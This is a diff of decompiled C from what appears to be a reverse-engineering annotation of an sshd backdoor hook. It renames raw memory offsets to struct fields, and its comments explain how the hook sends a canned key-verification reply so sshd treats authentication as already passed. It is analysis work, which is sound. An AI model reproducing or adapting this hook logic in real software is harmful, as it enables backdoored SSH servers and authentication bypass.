@@ -23,16 +23,16 @@ int mm_answer_keyverify_send_staged_reply_hook(ssh *ssh,int sock,sshbuf *m)
   if (global_ctx == 0) {
     return 0;
   }
-  libc_imports = *(libc_imports_t **)(global_ctx + 0x10);
-  if ((libc_imports != (libc_imports_t *)0x0) && (sshd_ctx = *(long *)(global_ctx + 0x20), sshd_ctx != 0)) {
+  libc_imports = global_ctx->libc_imports;
+  if ((libc_imports != (libc_imports_t *)0x0) && (sshd_ctx = global_ctx->sshd_ctx, sshd_ctx != (sshd_ctx_t *)0x0)) {
     // AutoDoc: Only run when keyallowed already staged both the reply length and buffer; otherwise keep sshd’s original handler.
-    if ((*(ushort *)(sshd_ctx + 0x84) != 0) &&
-       ((*(void **)(sshd_ctx + 0x88) != (void *)0x0 &&
+    if ((sshd_ctx->keyverify_reply_len != 0) &&
+       ((sshd_ctx->keyverify_reply_buf != (void *)0x0 &&
         // AutoDoc: Send the canned reply straight to the monitor socket so sshd believes the keyverify exchange already succeeded.
-        (write_result = fd_write_full(sock,*(void **)(sshd_ctx + 0x88),(ulong)*(ushort *)(sshd_ctx + 0x84),libc_imports)
+        (write_result = fd_write_full(sock,sshd_ctx->keyverify_reply_buf,(ulong)sshd_ctx->keyverify_reply_len,libc_imports)
         , -1 < write_result)))) {
       // AutoDoc: Drop the preserved mm_answer_keyverify pointer back into the live dispatch slot before returning success.
-      **(u64 **)(sshd_ctx + 0xa0) = *(u64 *)(sshd_ctx + 0xd8);
+      *sshd_ctx->mm_answer_keyverify_slot = sshd_ctx->mm_answer_keyverify_start;
       return 1;
     }
     // AutoDoc: Any missing metadata or short write forces an immediate `exit(0)` so sshd never continues with a half-applied hook.
